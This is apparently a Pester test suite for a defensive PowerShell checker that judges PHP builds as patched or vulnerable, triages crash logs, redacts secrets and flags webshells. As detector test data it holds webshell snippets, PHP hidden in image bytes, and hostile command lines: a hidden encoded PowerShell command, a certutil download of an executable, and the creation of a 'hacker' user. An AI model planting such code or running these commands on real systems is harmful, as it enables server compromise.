#Requires -Modules @{ ModuleName = 'Pester'; ModuleVersion = '5.0.0' }
# Pester 5 tests for the pure functions of php2shell-check.ps1.
# Run: Invoke-Pester -Path ./tests/ps1

BeforeAll {
    $script:RepoRoot = [System.IO.Path]::GetFullPath([System.IO.Path]::Combine($PSScriptRoot, '..', '..'))
    # Dot-sourcing defines the functions without running the checker.
    . ([System.IO.Path]::Combine($script:RepoRoot, 'php2shell-check.ps1'))
    Set-StrictMode -Version 2.0

    function New-P2STestBytes {
        param([string]$Text)
        return , ([System.Text.Encoding]::GetEncoding(28591).GetBytes("MZ`0`0garbage`0" + $Text + "`0tail`0"))
    }
}

Describe 'ConvertTo-P2SVersion' {
    It 'parses a plain release' {
        $v = ConvertTo-P2SVersion '8.3.12'
        $v.Major | Should -Be 8
        $v.Minor | Should -Be 3
        $v.Patch | Should -Be 12
        $v.SuffixKind | Should -Be 'none'
        $v.Branch | Should -Be '8.3'
    }
    It 'treats <Text> as a pre-release' -TestCases @(
        @{ Text = '8.6.0RC3' }, @{ Text = '8.6.0rc1' }, @{ Text = '8.6.0alpha1' }, @{ Text = '8.6.0beta2' }, @{ Text = '8.7.0-dev' }
    ) {
        param($Text)
        (ConvertTo-P2SVersion $Text).SuffixKind | Should -Be 'prerelease'
    }
    It 'treats a distro suffix as a vendor build of the same triple' {
        $v = ConvertTo-P2SVersion '8.1.2-1ubuntu2.20'
        $v.SuffixKind | Should -Be 'vendor'
        $v.Major | Should -Be 8
        $v.Minor | Should -Be 1
        $v.Patch | Should -Be 2
        $v.Branch | Should -Be '8.1'
    }
    It 'returns nothing for <Text>' -TestCases @(@{ Text = '' }, @{ Text = 'PHP' }, @{ Text = '8.3' }) {
        param($Text)
        ConvertTo-P2SVersion $Text | Should -BeNullOrEmpty
    }
}

Describe 'Compare-P2SVersion' {
    It '<A> vs <B> is <Expected>' -TestCases @(
        @{ A = '8.3.12'; B = '8.3.36'; Expected = -1 },
        @{ A = '8.3.36'; B = '8.3.36'; Expected = 0 },
        @{ A = '8.4.27'; B = '8.4.26'; Expected = 1 },
        @{ A = '8.2.100'; B = '8.2.35'; Expected = 1 },
        @{ A = '8.6.0RC3'; B = '8.6.0'; Expected = -1 },
        @{ A = '8.6.0RC3'; B = '8.6.0RC4'; Expected = -1 },
        @{ A = '8.6.0beta3'; B = '8.6.0RC1'; Expected = -1 },
        @{ A = '8.7.0-dev'; B = '8.7.0alpha1'; Expected = -1 },
        @{ A = '8.1.2-1ubuntu2.20'; B = '8.1.2'; Expected = 0 },
        @{ A = '10.0.0'; B = '9.9.9'; Expected = 1 }
    ) {
        param($A, $B, $Expected)
        Compare-P2SVersion $A $B | Should -Be $Expected
    }
}

Describe 'Get-P2SBranchInfo' {
    It '<Version> is <Status> (fixed <Fixed>)' -TestCases @(
        @{ Version = '8.5.11'; Status = 'supported'; Fixed = '8.5.12' },
        @{ Version = '8.4.26'; Status = 'supported'; Fixed = '8.4.27' },
        @{ Version = '8.3.12'; Status = 'supported'; Fixed = '8.3.36' },
        @{ Version = '8.2.20'; Status = 'supported'; Fixed = '8.2.35' },
        @{ Version = '8.1.34'; Status = 'eol'; Fixed = $null },
        @{ Version = '8.0.30'; Status = 'eol'; Fixed = $null },
        @{ Version = '7.4.33'; Status = 'eol'; Fixed = $null },
        @{ Version = '5.6.40'; Status = 'eol'; Fixed = $null },
        @{ Version = '8.6.0RC3'; Status = 'prerelease'; Fixed = $null },
        @{ Version = '8.6.0-dev'; Status = 'prerelease'; Fixed = $null },
        @{ Version = '8.7.0-dev'; Status = 'prerelease'; Fixed = $null },
        @{ Version = '8.7.0alpha1'; Status = 'prerelease'; Fixed = $null },
        @{ Version = '8.6.0'; Status = 'newer'; Fixed = $null },
        @{ Version = '8.6.1-1+deb13u1'; Status = 'newer'; Fixed = $null },
        @{ Version = '8.7.0'; Status = 'newer'; Fixed = $null },
        @{ Version = '8.8.0-dev'; Status = 'newer'; Fixed = $null },
        @{ Version = '9.0.0'; Status = 'newer'; Fixed = $null }
    ) {
        param($Version, $Status, $Fixed)
        $b = Get-P2SBranchInfo $Version
        $b.Status | Should -Be $Status
        $b.Fixed | Should -Be $Fixed
    }
}

Describe 'Get-P2SVerdict (docs/SPEC.md section 3)' {
    It 'rule 1: unreadable version is UNKNOWN' {
        $r = Get-P2SVerdict -VersionText '' -Fingerprint $null
        $r.Verdict | Should -Be 'UNKNOWN'
        $r.Evidence | Should -Be 'none'
        $r.Reason | Should -Be 'version-unreadable'
    }
    It 'rule 2: fingerprint wins, even on an EOL branch' {
        $r = Get-P2SVerdict -VersionText '8.1.34' -Fingerprint $true
        $r.Verdict | Should -Be 'FIXED'
        $r.Evidence | Should -Be 'fingerprint'
    }
    It 'rule 2: fingerprint wins on an unpatched-looking pre-release' {
        (Get-P2SVerdict -VersionText '8.6.0RC3' -Fingerprint $true).Verdict | Should -Be 'FIXED'
    }
    It 'rule 3: supported branch at the fixed version is FIXED by version' {
        $r = Get-P2SVerdict -VersionText '8.5.12' -Fingerprint $null
        $r.Verdict | Should -Be 'FIXED'
        $r.Evidence | Should -Be 'version'
        $r.Reason | Should -Be 'at-or-above-fixed-version'
    }
    It 'rule 3: notes a missing fingerprint' {
        $r = Get-P2SVerdict -VersionText '8.3.36' -Fingerprint $false
        $r.Verdict | Should -Be 'FIXED'
        $r.Reason | Should -Match 'fingerprint-missing'
    }
    It 'rule 4: vendor changelog naming the CVE is FIXED' {
        $r = Get-P2SVerdict -VersionText '8.2.20' -Fingerprint $false -ChangelogMentionsCve $true
        $r.Verdict | Should -Be 'FIXED'
        $r.Evidence | Should -Be 'changelog'
    }
    It 'rule 4 beats rule 6 (EOL with vendor changelog)' {
        (Get-P2SVerdict -VersionText '8.1.2-1ubuntu2.25' -Fingerprint $false -ChangelogMentionsCve $true).Evidence | Should -Be 'changelog'
    }
    It 'rule 5: vendor fixed-version data is FIXED' {
        $r = Get-P2SVerdict -VersionText '8.2.20' -Fingerprint $false -VendorDataFixed $true
        $r.Verdict | Should -Be 'FIXED'
        $r.Evidence | Should -Be 'vendor-data'
        $r.Reason | Should -Be 'vendor-fixed-package-version'
    }
    It 'rule 6: <Version> (EOL) is VULNERABLE with no upstream fix' -TestCases @(
        @{ Version = '8.1.34' }, @{ Version = '8.0.30' }, @{ Version = '7.4.33' }, @{ Version = '7.0.33' }, @{ Version = '5.6.40' }
    ) {
        param($Version)
        $r = Get-P2SVerdict -VersionText $Version -Fingerprint $false
        $r.Verdict | Should -Be 'VULNERABLE'
        $r.Reason | Should -Be 'eol-no-upstream-fix'
        $r.Remediation | Should -Match 'supported branch'
    }
    It 'rule 7: unpatched pre-release <Version> is VULNERABLE' -TestCases @(
        @{ Version = '8.6.0RC3' }, @{ Version = '8.6.0beta2' }, @{ Version = '8.6.0-dev' }, @{ Version = '8.7.0-dev' }, @{ Version = '8.7.0alpha1' }
    ) {
        param($Version)
        $r = Get-P2SVerdict -VersionText $Version -Fingerprint $false
        $r.Verdict | Should -Be 'VULNERABLE'
        $r.Reason | Should -Be 'prerelease-unpatched'
        $r.BranchStatus | Should -Be 'prerelease'
        $r.Remediation | Should -Match 'stable release'
    }
    It 'rule 8: <Version> without the fingerprint is UNKNOWN (newer than the data)' -TestCases @(
        @{ Version = '8.6.0' }, @{ Version = '8.6.1-1+deb13u1' }, @{ Version = '8.7.0' }, @{ Version = '8.8.0-dev' }, @{ Version = '9.0.0' }
    ) {
        param($Version)
        $r = Get-P2SVerdict -VersionText $Version -Fingerprint $false
        $r.Verdict | Should -Be 'UNKNOWN'
        $r.Reason | Should -Be 'branch-newer-than-data'
        $r.BranchStatus | Should -Be 'newer'
        $r.Remediation | Should -Match 'newer than'
    }
    It 'rule 2 still wins for a newer branch with the fingerprint' {
        (Get-P2SVerdict -VersionText '8.7.0' -Fingerprint $true).Verdict | Should -Be 'FIXED'
    }
    It 'rule 9: supported branch below the fixed version is VULNERABLE' {
        $r = Get-P2SVerdict -VersionText '8.4.26' -Fingerprint $false
        $r.Verdict | Should -Be 'VULNERABLE'
        $r.Reason | Should -Be 'below-fixed-version'
        $r.FixedVersion | Should -Be '8.4.27'
        $r.Remediation | Should -Match '8\.4\.27'
    }
    It 'vendor builds below the fix get vendor-may-backport' {
        $r = Get-P2SVerdict -VersionText '8.2.29-1~deb12u1' -Fingerprint $false
        $r.Verdict | Should -Be 'VULNERABLE'
        $r.Reason | Should -Be 'below-fixed-version,vendor-may-backport'
    }
    It 'vendor builds on EOL branches get vendor-may-backport' {
        (Get-P2SVerdict -VersionText '8.1.2-1ubuntu2.20' -Fingerprint $false).Reason | Should -Be 'eol-no-upstream-fix,vendor-may-backport'
    }
}

Describe 'Get-P2SBuildInfoFromBytes' {
    It 'reads the version and the patch fingerprint' {
        $b = Get-P2SBuildInfoFromBytes -Bytes (New-P2STestBytes "X-Powered-By: PHP/8.3.36`0zzz`0Hard memory limit of %zu bytes exhausted (tried to allocate %zu bytes)")
        $b.Version | Should -Be '8.3.36'
        $b.Fingerprint | Should -BeTrue
    }
    It 'accepts the secondary fingerprint' {
        (Get-P2SBuildInfoFromBytes -Bytes (New-P2STestBytes "X-Powered-By: PHP/8.2.35`0memory_hard_limit_percent")).Fingerprint | Should -BeTrue
    }
    It 'keeps vendor and pre-release suffixes' -TestCases @(@{ V = '8.1.2-1ubuntu2.20' }, @{ V = '8.6.0RC3' }, @{ V = '8.7.0-dev' }) {
        param($V)
        $b = Get-P2SBuildInfoFromBytes -Bytes (New-P2STestBytes ("X-Powered-By: PHP/" + $V))
        $b.Version | Should -Be $V
        $b.Fingerprint | Should -BeFalse
    }
    It 'reports no version when the string is missing' {
        $b = Get-P2SBuildInfoFromBytes -Bytes (New-P2STestBytes 'nothing to see')
        $b.Version | Should -BeNullOrEmpty
        $b.Fingerprint | Should -BeFalse
    }
    It 'reports an unknown fingerprint for empty input' {
        (Get-P2SBuildInfoFromBytes -Bytes ([byte[]]@())).Fingerprint | Should -BeNullOrEmpty
    }
}

Describe 'Log parsing' {
    It 'dates <Line>' -TestCases @(
        @{ Line = '[Wed Oct 21 10:00:00.123456 2026] [mpm_winnt:notice] AH00428: Parent: child process 1 exited with status 3221225477'; Expected = 20261021 },
        @{ Line = '[Tue Oct 20 09:00:00 2026] [error] x'; Expected = 20261020 },
        @{ Line = '[21-Oct-2026 10:00:00 UTC] PHP Fatal error:  x'; Expected = 20261021 },
        @{ Line = '2026-10-19 23:59:59 something'; Expected = 20261019 },
        @{ Line = '2026/10/21 10:00:00 [error] 1#1: x'; Expected = 20261021 },
        @{ Line = 'no timestamp here'; Expected = 0 }
    ) {
        param($Line, $Expected)
        Get-P2SLogDate $Line | Should -Be $Expected
    }
    It 'classifies <Line> as <Expected>' -TestCases @(
        @{ Line = 'AH00428: Parent: child process 5678 exited with status 3221225477 -- Restarting.'; Expected = 'crash' },
        @{ Line = '[core:notice] AH00052: child pid 123 exit signal Segmentation fault (11)'; Expected = 'crash' },
        @{ Line = 'WARNING: [pool www] child 42 exited on signal 11 (SIGSEGV) after 0.5 seconds from start'; Expected = 'crash' },
        @{ Line = 'zend_mm_heap corrupted'; Expected = 'crash' },
        @{ Line = 'PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes) in Unknown on line 0'; Expected = 'oom-prescript' },
        @{ Line = 'PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes) in C:\site\a.php on line 9'; Expected = 'oom' },
        @{ Line = 'PHP Warning:  Unknown: Input variables exceeded 1000. in Unknown on line 0'; Expected = 'prescript' },
        @{ Line = 'PHP Fatal error:  Maximum execution time of 30 seconds exceeded in C:\a.php on line 3'; Expected = 'timeout' },
        @{ Line = 'PHP Fatal error:  Hard memory limit of 268435456 bytes exhausted (tried to allocate 1 bytes) in Unknown on line 0'; Expected = 'hard-oom' }
    ) {
        param($Line, $Expected)
        Get-P2SLogLineCategory $Line | Should -Be $Expected
    }
    It 'ignores ordinary lines' {
        Get-P2SLogLineCategory 'PHP Notice:  Undefined index: a in C:\a.php on line 3' | Should -BeNullOrEmpty
    }
}

Describe 'INI parsing' {
    It 'parses values, quotes and comments' {
        $h = ConvertFrom-P2SIniLines -Lines @('[PHP]', '; comment', 'memory_limit = 256M ; inline', 'session.upload_progress.enabled = Off', 'error_log = "C:\logs\php errors.log"', 'Memory_Limit=-1')
        $h['memory_limit'] | Should -Be '-1'
        $h['session.upload_progress.enabled'] | Should -Be 'Off'
        $h['error_log'] | Should -Be 'C:\logs\php errors.log'
    }
    It 'reads <Value> as <Expected>' -TestCases @(
        @{ Value = 'On'; Expected = $true }, @{ Value = '1'; Expected = $true }, @{ Value = 'off'; Expected = $false }, @{ Value = '0'; Expected = $false }, @{ Value = ''; Expected = $false }
    ) {
        param($Value, $Expected)
        Test-P2SIniTrue $Value | Should -Be $Expected
    }
    It 'flags advisory diagnostic directives' -TestCases @(
        @{ D = 'auto_detect_line_endings'; Expected = $true }, @{ D = 'assert.active'; Expected = $true }, @{ D = 'mbstring.internal_encoding'; Expected = $true },
        @{ D = 'memory_limit'; Expected = $false }, @{ D = 'upload_max_filesize'; Expected = $false }
    ) {
        param($D, $Expected)
        Test-P2SDiagnosticDirective $D | Should -Be $Expected
    }
}

Describe 'Webshell patterns' {
    It 'matches <Name>' -TestCases @(
        @{ Name = 'eval-of-decoded-data'; Code = '<?php eval(base64_decode("ZWNobyAx"));' },
        @{ Name = 'exec-of-request-input'; Code = '<?php system($_GET["c"]);' },
        @{ Name = 'request-input-called'; Code = '<?php $_POST["f"]($_POST["a"]);' },
        @{ Name = 'known-webshell-marker'; Code = '<?php $x = "FilesMan";' }
    ) {
        param($Name, $Code)
        Get-P2SWebshellMatch $Code | Should -Be $Name
    }
    It 'ignores ordinary PHP' {
        Get-P2SWebshellMatch '<?php echo htmlspecialchars($_GET["q"] ?? "", ENT_QUOTES);' | Should -BeNullOrEmpty
    }
}

Describe 'Code in images (docs/SPEC.md section 5)' {
    It '<Name> is <Expected>' -TestCases @(
        @{ Name = 'eval after the opening tag'; Text = ('GIF89a' + [char]0 + '<?php eval($_POST["x"]); ?>'); Expected = 'HIGH' },
        @{ Name = 'system after the opening tag'; Text = ('GIF89a' + [char]0 + "<?php`n  system ('id');"); Expected = 'HIGH' },
        # Each string starts with '' : [char] + [string] would be numeric addition.
        @{ Name = 'short echo of request input'; Text = ('' + [char]0 + '<?= $_GET["c"] ?>'); Expected = 'HIGH' },
        @{ Name = 'a webshell marker'; Text = ('' + [char]0 + '<?php /* FilesMan */'); Expected = 'HIGH' },
        @{ Name = 'a bare opening tag'; Text = ('' + [char]0x89 + 'PNG' + [char]0 + '<?php ' + [char]0 + [char]1); Expected = 'REVIEW' },
        @{ Name = 'a bare short tag'; Text = ('' + [char]0 + '<?=' + [char]0x13 + [char]0x88); Expected = $null },
        @{ Name = 'image data'; Text = ('' + [char]0x89 + 'PNG' + [char]0 + 'IHDR IDAT'); Expected = $null }
    ) {
        param($Name, $Text, $Expected)
        Get-P2SImageCodeLevel $Text | Should -Be $Expected
    }
}

Describe 'Text safety (docs/SPEC.md section 5)' {
    It 'redacts <Name>' -TestCases @(
        @{ Name = 'mysql -p<pw>'; Line = 'mysql -uroot -pS3cretPw db1'; Keep = 'db1' },
        @{ Name = '7-Zip -p<pw>'; Line = '"C:\Program Files\7-Zip\7z.exe" x -pS3cretPw a.zip'; Keep = 'a.zip' },
        @{ Name = 'sshpass -p <pw>'; Line = 'sshpass -p S3cretPw ssh root@host'; Keep = 'ssh root@host' },
        @{ Name = 'curl -u user:pass'; Line = 'curl -u admin:S3cretPw https://example.com/x'; Keep = 'https://example.com/x' },
        @{ Name = '--password='; Line = 'app.exe --password=S3cretPw --verbose'; Keep = '--verbose' },
        @{ Name = '-Password <pw>'; Line = 'powershell -File C:\b.ps1 -Password S3cretPw -Server db1'; Keep = '-Server db1' },
        @{ Name = 'redis-cli -a'; Line = 'redis-cli -h 127.0.0.1 -a S3cretPw ping'; Keep = 'ping' },
        @{ Name = 'Authorization: Bearer'; Line = 'curl -H "Authorization: Bearer S3cretPw" https://example.com'; Keep = 'https://example.com' },
        @{ Name = 'an API key header'; Line = 'curl -H "X-Api-Key: S3cretPw" https://example.com'; Keep = 'https://example.com' },
        @{ Name = 'a token in a query string'; Line = 'curl "https://example.com/?token=S3cretPw&page=2"'; Keep = 'page=2' },
        @{ Name = 'a cookie header'; Line = 'curl -H "Cookie: PHPSESSID=S3cretPw; lang=en" https://example.com'; Keep = 'https://example.com' },
        @{ Name = 'URL credentials'; Line = 'git clone https://bob:S3cretPw@example.com/r.git'; Keep = 'https://***@example.com/r.git' },
        @{ Name = 'an environment secret'; Line = 'cmd /c set DB_PASSWORD=S3cretPw && run.bat'; Keep = 'run.bat' },
        @{ Name = 'PGPASSWORD='; Line = 'cmd /c set PGPASSWORD=S3cretPw&& pg_dump db1'; Keep = 'pg_dump db1' },
        @{ Name = 'a net user password'; Line = 'net user hacker S3cretPw /add'; Keep = '/add' },
        @{ Name = 'a schtasks /rp password'; Line = 'schtasks /create /tn x /ru admin /rp S3cretPw'; Keep = '/ru admin' }
    ) {
        param($Name, $Line, $Keep)
        $out = ConvertTo-P2SRedactedText $Line
        $out | Should -Not -Match 'S3cretPw'
        $out.Contains($Keep) | Should -BeTrue
    }
    It 'leaves an ordinary command line readable: <Line>' -TestCases @(
        @{ Line = 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA' },
        @{ Line = 'certutil.exe -urlcache -split -f http://198.51.100.7/a.exe C:\Windows\Temp\a.exe' },
        @{ Line = 'powershell -Command "Get-ChildItem -Path C:\inetpub -Recurse"' },
        @{ Line = 'cmd.exe /c whoami /priv' }
    ) {
        param($Line)
        ConvertTo-P2SRedactedText $Line | Should -Be $Line
    }
    It 'stays fast on a crafted command line' {
        $t = Measure-Command { $null = ConvertTo-P2SRedactedText ('pass-' * 2000) }
        $t.TotalSeconds | Should -BeLessThan 5
    }
    It 'replaces control characters, including ESC and C1 codes' {
        Format-P2SClean ('a' + [char]27 + '[31mb' + [char]0x9B + 'c' + [char]10 + 'd') | Should -Be 'a [31mb c d'
    }
    It 'escapes non-ASCII JSON text, so the report is valid whatever the output encoding' {
        $name = 'C:\sites\caf' + [char]0xE9 + '\' + [char]0x65E5
        $json = ConvertTo-Json -InputObject ([ordered]@{ path = $name }) -Compress
        $out = ConvertTo-P2SAsciiJson $json
        ($out -match '[^\x00-\x7E]') | Should -BeFalse
        $out | Should -Match '\\u00e9'
        (ConvertFrom-Json $out).path | Should -Be $name
    }
    It 'keeps a surrogate pair and replaces a lone surrogate with ?' {
        $s = '"' + [char]0xD83D + [char]0xDE00 + 'x' + [char]0xD800 + '"'
        ConvertTo-P2SAsciiJson $s | Should -Be '"\ud83d\ude00x?"'
    }
}

Describe 'Dates do not depend on the system calendar' {
    It 'formats and compares dates in the Gregorian calendar under th-TH' {
        $old = [System.Threading.Thread]::CurrentThread.CurrentCulture
        try {
            [System.Threading.Thread]::CurrentThread.CurrentCulture = [System.Globalization.CultureInfo]::GetCultureInfo('th-TH')
            $d = New-Object -TypeName System.DateTime -ArgumentList 2026, 10, 20
            Format-P2SDate $d | Should -Be '2026-10-20'
            Format-P2SDate $d 'dd-MMM-yyyy' | Should -Be '20-Oct-2026'
            ConvertTo-P2SDateInt $d | Should -Be 20261020
        }
        finally { [System.Threading.Thread]::CurrentThread.CurrentCulture = $old }
    }
}

Describe 'Event log text' {
    It 'matches a crash event by its properties when Message is empty' {
        $rec = [pscustomobject]@{
            Message    = ''
            Properties = @([pscustomobject]@{ Value = 'php-cgi.exe' }, [pscustomobject]@{ Value = '8.3.12.0' }, [pscustomobject]@{ Value = 'php8ts.dll' })
        }
        $text = Get-P2SEventText -Record $rec
        $text | Should -Match 'php8ts\.dll'
        Test-P2SPhpEventText $text | Should -BeTrue
    }
    It 'ignores events of other programs' {
        Test-P2SPhpEventText 'Faulting application name: notepad.exe' | Should -BeFalse
    }
}

Describe 'Log triage (docs/SPEC.md section 5)' {
    BeforeAll {
        function New-P2STestLog {
            param([string]$Name, [string[]]$Lines)
            $p = Join-Path $TestDrive $Name
            Set-Content -LiteralPath $p -Value $Lines -Encoding ASCII
            return $p
        }
        function Format-P2STestLine {
            param([datetime]$Date, [string]$Text)
            return ('[{0}] {1}' -f (Format-P2SDate $Date 'dd-MMM-yyyy HH:mm:ss'), $Text)
        }
        $script:CrashText = 'WARNING: [pool www] child 42 exited on signal 11 (SIGSEGV) after 0.5 seconds from start'
    }
    BeforeEach {
        Reset-P2SState
        $script:P2S_Opt.SinceDate = (Get-Date).Date.AddDays(-1)
    }
    It 'groups rotated files into one family: <Name>' -TestCases @(
        @{ Name = 'error.log.1' }, @{ Name = 'error.log.2.gz' }, @{ Name = 'error.log-20261020' }, @{ Name = 'error.2026-10-20.log' }
    ) {
        param($Name)
        Get-P2SLogFamilyKey ('C:\logs\' + $Name) | Should -Be (Get-P2SLogFamilyKey 'C:\logs\error.log')
    }
    It 'keeps different logs apart' {
        Get-P2SLogFamilyKey 'C:\logs\access.log' | Should -Not -Be (Get-P2SLogFamilyKey 'C:\logs\error.log')
    }
    It 'a crash in the window is HIGH when the log covers earlier days and shows none there' {
        $s = $script:P2S_Opt.SinceDate
        $log = New-P2STestLog 'a-error.log' @((Format-P2STestLine $s.AddDays(-10) 'NOTICE: fpm is running, pid 1'), (Format-P2STestLine $s.AddHours(12) $script:CrashText))
        Invoke-P2SLogFamilyTriage -Family ([pscustomobject]@{ Label = $log; Files = @($log) }) | Should -BeTrue
        $crash = @($script:P2S_Findings | Where-Object { $_.category -eq 'crash' })
        $crash.Count | Should -Be 1
        $crash[0].severity | Should -Be 'HIGH'
    }
    It 'a crash in the window is REVIEW when the log has nothing older to compare with' {
        $s = $script:P2S_Opt.SinceDate
        $log = New-P2STestLog 'b-error.log' @((Format-P2STestLine $s.AddHours(12) $script:CrashText))
        $null = Invoke-P2SLogFamilyTriage -Family ([pscustomobject]@{ Label = $log; Files = @($log) })
        $crash = @($script:P2S_Findings | Where-Object { $_.category -eq 'crash' })
        $crash[0].severity | Should -Be 'REVIEW'
        $crash[0].detail | Should -Match 'nothing from before'
    }
    It 'a crash in the window is REVIEW when the log shows crashes before it' {
        $s = $script:P2S_Opt.SinceDate
        $log = New-P2STestLog 'c-error.log' @((Format-P2STestLine $s.AddDays(-5) $script:CrashText), (Format-P2STestLine $s.AddHours(12) $script:CrashText))
        $null = Invoke-P2SLogFamilyTriage -Family ([pscustomobject]@{ Label = $log; Files = @($log) })
        @($script:P2S_Findings | Where-Object { $_.category -eq 'crash' })[0].severity | Should -Be 'REVIEW'
    }
    It 'reads the newest older rotated file of the family for the comparison' {
        $s = $script:P2S_Opt.SinceDate
        $cur = New-P2STestLog 'd-error.log' @((Format-P2STestLine $s.AddHours(12) $script:CrashText))
        $old = New-P2STestLog 'd-error.log.1' @((Format-P2STestLine $s.AddDays(-3) $script:CrashText))
        (Get-Item -LiteralPath $old).LastWriteTime = $s.AddDays(-2)
        $script:P2S_ErrorLogs.Add($cur)
        $fam = @(Get-P2SLogFamilies | Where-Object { $_.Label -eq $cur })
        $fam.Count | Should -Be 1
        @($fam[0].Files).Count | Should -Be 2
        $null = Invoke-P2SLogFamilyTriage -Family $fam[0]
        @($script:P2S_Findings | Where-Object { $_.category -eq 'crash' })[0].severity | Should -Be 'REVIEW'
    }
    It 'a pre-script out-of-memory error is HIGH' {
        $s = $script:P2S_Opt.SinceDate
        $log = New-P2STestLog 'e-error.log' @((Format-P2STestLine $s.AddHours(12) 'PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes) in Unknown on line 0'))
        $null = Invoke-P2SLogFamilyTriage -Family ([pscustomobject]@{ Label = $log; Files = @($log) })
        @($script:P2S_Findings | Where-Object { $_.category -eq 'oom' })[0].severity | Should -Be 'HIGH'
    }
}

Describe 'Installations (docs/SPEC.md sections 3 and 6)' {
    BeforeEach { Reset-P2SState }
    It 'records a PHP binary without a readable build as UNKNOWN with a coverage note, never drops it' {
        $dir = Join-Path $TestDrive 'nocore'
        $null = New-Item -ItemType Directory -Path $dir -Force
        $exe = Join-Path $dir 'php-cgi.exe'
        [System.IO.File]::WriteAllBytes($exe, (New-P2STestBytes 'no version string'))
        Register-P2SPhpFile -Path $exe -Sapi 'cgi' -Evidence 'test'
        $r = @(Get-P2SInstallationRecords)
        $r.Count | Should -Be 1
        $r[0].verdict | Should -Be 'UNKNOWN'
        $r[0].reason | Should -Be 'version-unreadable'
        $r[0].sapi | Should -Be 'cgi'
        Split-Path -Path $r[0].path -Leaf | Should -Be 'php-cgi.exe'
        (@($script:P2S_Coverage) -join ' ') | Should -Match 'php-cgi\.exe'
    }
    It 'reads a static build that carries the version string itself' {
        $dir = Join-Path $TestDrive 'static'
        $null = New-Item -ItemType Directory -Path $dir -Force
        $exe = Join-Path $dir 'php-cgi.exe'
        [System.IO.File]::WriteAllBytes($exe, (New-P2STestBytes ("X-Powered-By: PHP/8.4.27`0Hard memory limit of %zu bytes")))
        Register-P2SPhpFile -Path $exe -Sapi 'cgi' -Evidence 'test'
        $r = @(Get-P2SInstallationRecords)
        $r.Count | Should -Be 1
        $r[0].version | Should -Be '8.4.27'
        $r[0].verdict | Should -Be 'FIXED'
        $r[0].evidence | Should -Be 'fingerprint'
    }
    It 'uses the core DLL a running process loaded when none is beside the module' {
        $mods = Join-Path $TestDrive 'Apache24\modules'
        $phpDir = Join-Path $TestDrive 'php82'
        $null = New-Item -ItemType Directory -Path $mods -Force
        $null = New-Item -ItemType Directory -Path $phpDir -Force
        $module = Join-Path $mods 'php8apache2_4.dll'
        $core = Join-Path $phpDir 'php8ts.dll'
        [System.IO.File]::WriteAllBytes($module, (New-P2STestBytes 'apache2handler'))
        [System.IO.File]::WriteAllBytes($core, (New-P2STestBytes 'X-Powered-By: PHP/8.2.20'))
        Register-P2SPhpFile -Path $module -Sapi 'mod_php' -Evidence 'test' -LoadedCore $core
        $r = @(Get-P2SInstallationRecords)
        $r.Count | Should -Be 1
        $r[0].sapi | Should -Be 'mod_php'
        $r[0].version | Should -Be '8.2.20'
        $r[0].verdict | Should -Be 'VULNERABLE'
        Split-Path -Path $r[0].path -Leaf | Should -Be 'php8apache2_4.dll'
        Split-Path -Path $r[0].install_dir -Leaf | Should -Be 'php82'
    }
    It 'reports the running build in running.version and running.verdict' {
        $dir = Join-Path $TestDrive 'run'
        $null = New-Item -ItemType Directory -Path $dir -Force
        $core = Join-Path $dir 'php8ts.dll'
        [System.IO.File]::WriteAllBytes($core, (New-P2STestBytes 'X-Powered-By: PHP/8.3.12'))
        $e = Add-P2SInstallEntry -CoreFile $core -Evidence 'test'
        $proc = [pscustomobject]@{ ProcessId = 101; ParentProcessId = 1; Name = 'php-cgi.exe'; Path = (Join-Path $dir 'php-cgi.exe'); CommandLine = ''; Created = (Get-Date).AddDays(1) }
        Add-P2SInstallSapi -Entry $e -Sapi 'cgi' -SapiPath $proc.Path -Process $proc
        $r = @(Get-P2SInstallationRecords)
        $r[0].running.processes | Should -Be 1
        $r[0].running.restart_required | Should -BeFalse
        $r[0].running.version | Should -Be '8.3.12'
        $r[0].running.verdict | Should -Be 'VULNERABLE'
    }
    It 'reports a replaced running image as UNKNOWN with restart_required' {
        $dir = Join-Path $TestDrive 'run-old'
        $null = New-Item -ItemType Directory -Path $dir -Force
        $core = Join-Path $dir 'php8ts.dll'
        [System.IO.File]::WriteAllBytes($core, (New-P2STestBytes 'X-Powered-By: PHP/8.3.36'))
        $e = Add-P2SInstallEntry -CoreFile $core -Evidence 'test'
        $proc = [pscustomobject]@{ ProcessId = 102; ParentProcessId = 1; Name = 'php-cgi.exe'; Path = (Join-Path $dir 'php-cgi.exe'); CommandLine = ''; Created = (New-Object -TypeName System.DateTime -ArgumentList 2000, 1, 1) }
        Add-P2SInstallSapi -Entry $e -Sapi 'cgi' -SapiPath $proc.Path -Process $proc
        $r = @(Get-P2SInstallationRecords)
        $r[0].verdict | Should -Be 'FIXED'
        $r[0].running.restart_required | Should -BeTrue
        $r[0].running.version | Should -Be ''
        $r[0].running.verdict | Should -Be 'UNKNOWN'
        (Get-P2SSummary -Installations $r -Findings @() -CoverageLimited $false).verdict | Should -Be 'VULNERABLE'
    }
    It 'leaves running.version and running.verdict empty when nothing runs' {
        $dir = Join-Path $TestDrive 'idle'
        $null = New-Item -ItemType Directory -Path $dir -Force
        $core = Join-Path $dir 'php8ts.dll'
        [System.IO.File]::WriteAllBytes($core, (New-P2STestBytes 'X-Powered-By: PHP/8.3.12'))
        $null = Add-P2SInstallEntry -CoreFile $core -Evidence 'test'
        $r = @(Get-P2SInstallationRecords)
        $r[0].running.processes | Should -Be 0
        $r[0].running.version | Should -Be ''
        $r[0].running.verdict | Should -Be ''
    }
}

Describe 'Per-request INI overrides' {
    BeforeEach { Reset-P2SState }
    It 'are reported as file:line and directive name, never with their value' {
        $root = Join-Path $TestDrive 'apache-ov'
        $null = New-Item -ItemType Directory -Path (Join-Path $root 'conf') -Force
        Set-Content -LiteralPath (Join-Path $root 'conf\httpd.conf') -Value @('# test', 'php_value session.use_trans_sid 1', 'php_admin_value open_basedir "C:/very-secret-value"') -Encoding ASCII
        Read-P2SApacheRoot -Root $root
        Add-P2SOverrideFindings
        $text = (@($script:P2S_Findings) | ForEach-Object { $_.title + ' ' + $_.location + ' ' + $_.detail }) -join ' '
        $text | Should -Not -Match 'very-secret-value'
        $text | Should -Match 'httpd\.conf:2'
        $text | Should -Match 'session\.use_trans_sid'
        $text | Should -Match 'httpd\.conf:3 php_admin_value open_basedir'
    }
}

